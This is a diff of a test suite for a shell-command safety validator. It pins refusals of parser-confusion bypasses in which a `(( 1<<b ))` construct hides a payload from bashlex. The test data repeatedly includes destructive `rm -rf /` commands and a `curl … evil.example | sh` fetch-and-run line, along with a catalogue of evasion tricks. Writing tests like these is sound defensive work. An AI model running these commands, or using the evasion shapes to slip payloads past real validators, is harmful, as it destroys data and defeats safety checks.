@@ -2327,15 +2327,24 @@ class TestHeredocSurroundings:
             val_module._neuter_heredocs(f"cat <<'A'\nz\nA\n{tail}\nrm -rf /")
 
     @pytest.mark.parametrize("opener,terminator", [("'A'", "A"), ("'A;B'", "A;B")], ids=["native", "fallback"])
-    def test_a_heredoc_only_bashlex_sees_fails_closed(self, safety_rules_path, opener, terminator):
-        """A `(( 1<<b ))` after a real heredoc: bashlex reads `<<b` as an opener, files the
-        payload as its body, and the arithmetic guard denies on the misparse it detects.
+    def test_a_heredoc_only_bashlex_sees_fails_closed(self, safety_rules_path, monkeypatch, opener, terminator):
+        """bashlex has this lexer's old bug, and it gets the last word on the re-parse.
 
-        The fallback lexer still keeps the payload in its rewrite (`_neuter_heredocs` reads
-        `(( … ))` as a shift, so `rm -rf /` survives), and the command is refused; the guard
-        names the construct, `..._is_refused_behind_a_lesser_rule` pins the phantom refusal.
-        Asserted on the reason, not `BLOCKED` alone, which this returned before the guard too.
+        Bash reads `(( 1<<b ))` as a left shift and so does `_rewrite_openers` -
+        the payload is still in the rewrite. bashlex reads `<<b` as a
+        redirection, so `rm -rf /` becomes its body and is dropped before any
+        rule runs, leaving the verdict at the whitelisted head's floor.
+
+        This was fail-closed by accident until `_close_heredocs` landed on main:
+        the segment used to re-enter this fallback, find no terminator and
+        raise. Re-attaching the body is correct for a real heredoc, and it
+        removed the accident - so the disagreement is detected now rather than
+        survived. Asserted on the rewrite and the reason, not on `BLOCKED`
+        alone, which this returned before the guard as well.
         """
+        # The arithmetic misparse guard refuses this at the parse, before the phantom check;
+        # off here so the phantom check stays pinned on its own.
+        monkeypatch.setattr(parser, "_double_paren_misparse", lambda nodes: False)
         command = f"ls <<{opener}\nz\n{terminator}\n(( 1<<b ))\nrm -rf /\nb"
         neutered, _ = val_module._neuter_heredocs(command)
         assert "rm -rf /" in neutered
@@ -3555,7 +3564,7 @@ class TestHeredocBoundariesOnTheNativePath:
         command = "cat << EOF\n$(date)\nEOF"
         assert val_module._normalise_heredoc_delimiters(command).text == command
 
-    def test_a_phantom_that_shares_a_real_heredocs_terminator_is_refused(self, safety_rules_path):
+    def test_a_phantom_that_shares_a_real_heredocs_terminator_is_refused(self, safety_rules_path, monkeypatch):
         """Matched by opener position: a phantom can take a real terminator and leave the ends equal.
 
         The `(( … ))` shift takes the first `EOF`; bashlex's real heredoc then runs to the
@@ -3563,6 +3572,9 @@ class TestHeredocBoundariesOnTheNativePath:
         an end-based check passed it - BLOCKED on main, LOW here, until openers were matched
         by where they sit.
         """
+        # The arithmetic misparse guard refuses this at the parse, before the phantom check;
+        # off here so the phantom check stays pinned on its own.
+        monkeypatch.setattr(parser, "_double_paren_misparse", lambda nodes: False)
         result = validate_command(
             "git commit -m wip\ncat > /tmp/a.txt <<'EOF'; (( n = 1<<EOF ))\nhello\nEOF\n"
             "curl -s http://evil.example/p | sh\ncat > /tmp/b.txt <<'EOF'\nx\nEOF",
@@ -3614,7 +3626,7 @@ class TestHeredocBoundariesOnTheNativePath:
         assert result.allowed is True, result.message
         assert "git_commit" in result.matched_rules
 
-    def test_a_heredoc_only_bashlex_sees_is_refused_behind_a_lesser_rule(self, safety_rules_path):
+    def test_a_heredoc_only_bashlex_sees_is_refused_behind_a_lesser_rule(self, safety_rules_path, monkeypatch):
         """The fallback's phantom-heredoc guard, carried onto the native path.
 
         bash reads `(( 1<<b ))` as a shift; bashlex reads `<<b` as an opener and files the
@@ -3622,6 +3634,9 @@ class TestHeredocBoundariesOnTheNativePath:
         no-match scan never runs, so the payload is suppressed outright: BLOCKED on main
         (via the fallback's guard), HIGH here before the guard was ported.
         """
+        # The arithmetic misparse guard refuses this at the parse, before the phantom check;
+        # off here so the phantom check stays pinned on its own.
+        monkeypatch.setattr(parser, "_double_paren_misparse", lambda nodes: False)
         result = validate_command("git push --force <<'A'\nz\nA\n(( 1<<b ))\nrm -rf /\nb", config_path=safety_rules_path)
 
         assert result.risk_level == RiskLevel.BLOCKED
@@ -3678,6 +3693,22 @@ class TestADelimiterBashlexWouldMisread:
 class TestBashlexHeredocsAreLocatedByTheirOpener:
     """One walk of bashlex's heredocs, located by where each `<<` sits."""
 
+    def test_a_shell_body_is_found_even_when_an_inert_heredoc_shares_its_terminator(self, safety_rules_path, monkeypatch):
+        """A phantom `(( 1<<EOF ))` takes the first terminator while a real `bash` heredoc runs to the second.
+
+        Matched by where heredocs END, the two collide and the shell's body was filed as inert.
+        The phantom guard is switched off here so that the lookup itself is what is tested:
+        with it on, the command is refused before bodies are ever read.
+        """
+        monkeypatch.setattr(val_module, "_phantom_heredoc", lambda *args, **kwargs: None)
+        monkeypatch.setattr(parser, "_double_paren_misparse", lambda nodes: False)
+        result = validate_command(
+            "cat <<'EOF'; (( 1<<EOF ))\nhello\nEOF\nbash <<'EOF'\nrm -rf /\nEOF", config_path=safety_rules_path
+        )
+
+        assert result.allowed is False
+        assert "shell_delegated_payload" in result.matched_rules
+
     @pytest.mark.parametrize(
         "command",
         ["while read l; do $l; done <<'EOF'\nrm -rf /\nEOF", "{ bash; } <<'EOF'\nrm -rf /\nEOF"],
@@ -3713,13 +3744,16 @@ class TestBashlexHeredocsAreLocatedByTheirOpener:
 
         assert result.allowed is True, result.message
 
-    def test_a_phantom_inside_a_substitution_is_refused_by_the_substitution_validator(self, safety_rules_path):
+    def test_a_phantom_inside_a_substitution_is_refused_by_the_substitution_validator(self, safety_rules_path, monkeypatch):
         """The phantom guard does not compare inside substitutions (see `_phantom_heredoc`).
 
         The one construct bashlex misreads as an opener is arithmetic `(( … ))`, and inside a
         substitution the substitution validator refuses it. That refusal is what covers this,
         so it is the refusal that is asserted.
         """
+        # The arithmetic misparse guard refuses this at the parse, before the phantom check;
+        # off here so the phantom check stays pinned on its own.
+        monkeypatch.setattr(parser, "_double_paren_misparse", lambda nodes: False)
         result = validate_command("git push --force <<'A'\nz\nA\nx=`(( 1<<b ))\nrm -rf /\nb`", config_path=safety_rules_path)
 
         assert result.allowed is False
@@ -3846,12 +3880,8 @@ class TestTheFallbackRefusesEveryProgramItCouldNotRead:
 
 
 def _misparse(command: str) -> bool:
-    """True when bashlex parses ``command`` into the arithmetic-`((`-misread tree the guard denies."""
-    try:
-        ast = val_module._get_parser().parse(command)
-    except Exception:
-        return False
-    return val_module._double_paren_misparse(ast)
+    """True when bashlex's raw tree for ``command`` is the arithmetic-`((` misread the parser refuses."""
+    return parser._double_paren_misparse(parser._bounded_parse(command))
 
 
 @pytest.mark.usefixtures("no_shellcheck")
@@ -3863,13 +3893,12 @@ class TestArithmeticCommandShift:
     rule sees, while bash evaluates the shift and runs it. The fail-open yielded SAFE,
     which every preset allows.
 
-    The guard keys on the tree bashlex builds for that misread - two adjacent nested
-    subshells with a `<<` inside - not on where the `((` sits in the text. bash never puts
-    the two `(` of a real subshell adjacent (it needs a separator between them), so the
-    shape is unforgeable; a `\\<newline>` splice, a comment or a quote around the opener,
-    each of which a text scanner missed, cannot change the AST. Denials are the guard's
-    construct-named BLOCKED, or a bashlex parse failure where the shape does not parse;
-    either way the command does not run.
+    `parse_bashlex` refuses the tree bashlex builds for that misread: a subshell whose inner
+    subshell is flush against it on both sides, with a `<<` inside. It keys on the AST, not
+    on where the `((` sits in the text, so no splice, comment or quote around the opener
+    changes the answer (a pre-parse text scan was tried and bypassed by each of those). Every
+    tree is built there, substitution bodies included. Denials are that parse refusal, or
+    another parse failure where the shape does not parse; either way the command does not run.
 
     Every attack row ran its payload under bash 5.3.9 (canary); every benign row was
     measured against main.
@@ -3898,7 +3927,15 @@ class TestArithmeticCommandShift:
                 "a shift whose operand is a real heredoc's delimiter",
             ),
             ("(( (a)<<b ))\nrm -rf /\nb", "the shift is on a parenthesised operand"),
-            # A decoy `((` in a comment or a quote defeated the text scanner; the AST does not.
+            ("(( 1<<-b ))\nrm -rf /\nb", "a `<<-` shift of a negated operand"),
+            # One substitution deep. The shift operand is a whitelisted word, so nothing but the
+            # parse-level guard stands between these and an allow.
+            ('echo "$( (( echo<<b ))\nrm -rf /\nb\n)"', "inside a quoted `$( … )`"),
+            ('git commit -m "$( (( echo<<b ))\nrm -rf /\nb\n)"', "inside a commit message's `$( … )`"),
+            ("echo $( (( echo<<b ))\nrm -rf /\nb\n)", "inside an unquoted `$( … )`"),
+            ("cat <<EOF\n$( (( echo<<b ))\nrm -rf /\nb\n)\nEOF\n", "inside an unquoted heredoc body's `$( … )`"),
+            ('echo "${x:-$( (( echo<<b ))\nrm -rf /\nb\n)}"', "inside a `${ … }` default's `$( … )`"),
+            # A decoy `((` in a comment or a quote, and splices around the real one.
             ('# (( "\n(( a" ))"+1<<b ))\nrm -rf /\nb', "a comment's `\"` around a decoy opener"),
             ("# (( '\n(( a' ))'1<<b ))\nrm -rf /\nb", "a comment's `'` around a decoy opener"),
             ("# note \\\\\n(( 1<<b ))\nrm -rf /\nb\n", "a comment ending in an escaped backslash"),
@@ -3906,13 +3943,13 @@ class TestArithmeticCommandShift:
             # The mixed splice bash makes and neither the all-spliced nor the as-written scan saw:
             # the comment's `\\` is left, and `(\\<newline>(` splices to `((`.
             ("# x \\\\\n(\\\n( 1<<b ))\nrm -rf /\nb\n", "a comment left, then a spliced `((`"),
-            # A pair the old scanner could not FOLLOW; bashlex parses the shape and the guard denies.
+            # Deep quoting, and a `case` or heredoc inside `$( … )`, inside the arithmetic.
             ('(( 1<<b + "' + "${a:-" * 600 + "x" + "}" * 600 + '" ))\nrm -rf /\nb', "quoting nested past the recursion limit"),
             ('(( 1<<b + "' + "${a:-" * 100 + "x" + "}" * 100 + '" ))\nrm -rf /\nb', "the same, below the recursion cliff"),
             ("(( 1<<b + $(case x in y) echo;; esac) ))\nrm -rf /\nb", "a `case` inside `$(…)` inside `((`"),
             ("(( 1<<b + $(cat <<Z\nq\nZ\n) ))\nrm -rf /\nb", "a heredoc inside `$(…)` inside `((`"),
             ("(( a[$(rm -rf /)] << b ))\nls\nb", "a command substitution in the arithmetic subscript"),
-            # Shapes the old text scanner mis-lexed: comment splice, heredoc-body apostrophes, deep nesting.
+            # A comment splice, heredoc-body apostrophes, decoy `((` in comments and bodies, deep nesting.
             ("# x\\\n(( 1<<b ))\nrm -rf /\nb", "a line splice ending a comment"),
             ("cat <<'E'\nit's\nE\n(( 1<<b ))\nrm -rf /\nb\ncat <<'F'\ndon't\nF", "heredoc-body apostrophes straddle the opener"),
             (": # ((\ncat <<'X'\n# ))\ncat <<'Y'\nX\nrm -rf /\nY", "a `((` bash reads as a comment, over a real heredoc"),
@@ -3922,7 +3959,7 @@ class TestArithmeticCommandShift:
         ],
     )
     def test_the_payload_after_the_shift_never_runs(self, safety_rules_path, command, description):
-        """Every one of these ran its payload under bash while schlock said SAFE at some round.
+        """bash runs the payload after every one of these (canary).
 
         Asserted on the verdict, not the deny message: the guard names the construct, but
         some of these parse-fail instead, and both are BLOCKED. What must hold is that the
@@ -3965,15 +4002,16 @@ class TestArithmeticCommandShift:
             ("(\n( 1<<b ) )\nrm -rf /\nb", "a newline between the parens"),
             ("(\t( 1<<b ) )\nrm -rf /\nb", "a tab between the parens"),
             ("((1<<b) )\nrm -rf /\nb", "adjacent `((`, but the closers do not double"),
+            ("( (cat <<b))\nrm -rf /\nb", "adjacent `))`, but the openers are spaced"),
         ],
     )
     def test_a_real_subshells_heredoc_is_not_over_denied(self, safety_rules_path, command, description):
         """A genuine `( ( … ) )` with a real heredoc must stay allowed.
 
-        bash reads `((` as arithmetic only with no separator between the parens, so a space,
-        newline or tab makes these two real subshells whose `<<b` really does open a heredoc:
-        bash runs nothing after it (canary). The guard keys on adjacency in the AST, so it
-        does not fire here - denying would be a false positive main does not have.
+        bash reads arithmetic only when both the `((` and the `))` are flush, so a space,
+        newline or tab on either side makes these two real subshells whose `<<b` really does
+        open a heredoc: bash runs nothing after it (canary). The guard needs both sides flush,
+        so it does not fire here - denying would be a false positive main does not have.
         """
         result = validate_command(command, config_path=safety_rules_path)
 
@@ -3993,21 +4031,39 @@ class TestArithmeticCommandShift:
         """A `((` bash never executes - quoted or commented - is a word to bashlex too.
 
         bashlex builds no subshell node for these, so the guard's adjacency shape is absent
-        and the verdict is whatever the rules make it: SAFE. The old text scanner had to
-        reason about quotes and comments to reach the same answer; the AST already has.
+        and the verdict is whatever the rules make it: SAFE.
         """
         result = validate_command(command, config_path=safety_rules_path)
 
         assert result.allowed is True, description
         assert result.risk_level == RiskLevel.SAFE, description
 
+    def test_a_substitution_heredoc_inside_arithmetic_is_allowed(self, safety_rules_path):
+        """`(( 1 + $(cat <<E … E) ))` is arithmetic whose operand is a command substitution.
+
+        The heredoc is that substitution's own and hides nothing, and bash runs the next line
+        as a command, which the rules see. So it is not the misread shape, and stays SAFE.
+        """
+        result = validate_command("(( 1 + $(cat <<EOF\n2\nEOF\n) ))\necho done", config_path=safety_rules_path)
+
+        assert result.allowed is True, result.message
+        assert result.risk_level == RiskLevel.SAFE
+
+    def test_a_comment_inside_the_inner_parens_is_over_denied(self, safety_rules_path):
+        """Known over-deny. bash ends `((echo # )` at the comment and runs the heredoc for real;
+        bashlex reads the parens as flush, so the guard refuses. bash hides nothing here, and
+        the cost is one refusal, which is the direction to be wrong in.
+        """
+        result = validate_command("((echo # )\ncat <<b\nrm -rf /\nb\n))", config_path=safety_rules_path)
+
+        assert result.allowed is False
+        assert "misread as nested subshells" in (result.error or "")
+
     def test_a_file_write_heredoc_body_is_not_scanned_for_openers(self, safety_rules_path):
         """A `((` in a quoted file-write heredoc body is data, and stays SAFE, as on main.
 
-        The replaced text scanner offered every `((` in the whole command, the heredoc body
-        included, and a body one reaching a `$(…)` with a `case` or `<<` hard-blocked an
-        ordinary `cat > file <<'EOF'`. The AST guard reads structure, not body text, so this
-        is SAFE again.
+        A text scan for `((` would read the body; the guard reads the tree, where a quoted
+        body is one opaque heredoc value.
         """
         command = "cat > app.js <<'EOF'\nconst s = \"((\";\n$(function(){ case 1 in a) esac; } )\nEOF"
 
@@ -4027,30 +4083,22 @@ class TestArithmeticCommandShift:
             ("(\t( 1<<b ) )\nb", False, "a tab is a real separator"),
             ("(( i++ ))", False, "no heredoc inside, so not the misread shape"),
             ("( (a) )", False, "real nested subshells, no heredoc"),
+            ("(( 1<<-b ))\nb", True, "a `<<-` redirect is a heredoc too"),
+            ("( (cat <<b))\nb", False, "the `))` is flush but the `((` is not"),
+            ("(( 1 + $(cat <<E\n2\nE\n) ))", False, "the heredoc belongs to a substitution inside"),
+            ("((echo # )\ncat <<b\nx\nb\n))", True, "known over-deny: bash ends the subshell at the `#`"),
         ],
     )
     def test_double_paren_misparse_keys_on_adjacency_and_a_heredoc(self, command, misparsed, description):
-        """The guard fires iff the inner `(` begins where the outer `(` ends AND a `<<` is inside.
+        """The guard fires when the inner subshell is flush on both sides AND a `<<` is inside.
 
-        The adjacency line is bash's own: it splices `(\\<newline>(` into `((` and needs a
-        separator between real subshells, so bashlex - which folds the splice into the opening
-        reservedword - puts the two `(` adjacent exactly when bash would read arithmetic. Each
-        row's `misparsed` value is the bash-canary answer to "does the payload run".
+        Flush on both sides is necessary for bash to read arithmetic; a separator on either
+        side makes real subshells. bashlex folds `\\<newline>` into the opening reservedword,
+        so `(`, splice, `(` counts as flush, as bash splices it into `((`. The heredoc must be
+        the subshell's own: one inside a substitution hides nothing. Each row's `misparsed`
+        value matches whether bash runs the payload (canary), except the pinned `# )` over-deny.
         """
         assert _misparse(command) is misparsed, description
-
-    def test_a_pair_it_cannot_follow_is_not_memoised_as_never_closing(self):
-        """`_DoubleParen`, still used by the heredoc fallback, keeps this invariant.
-
-        The never-closes memo records a span's failure, and `_UnfollowableParenError` is a
-        `ParseError`. Recorded, the second ask would answer "never closes" - a skip - where
-        the first answered "cannot follow" - a deny.
-        """
-        dparen = val_module._DoubleParen("(( $(case x in a) ;; esac) ))")
-
-        for _ in range(2):
-            with pytest.raises(val_module._UnfollowableParenError):
-                dparen.is_arithmetic(0)
 
 
 class TestAnUnquotedBodyIsReadThroughItsBackslashNewlines:
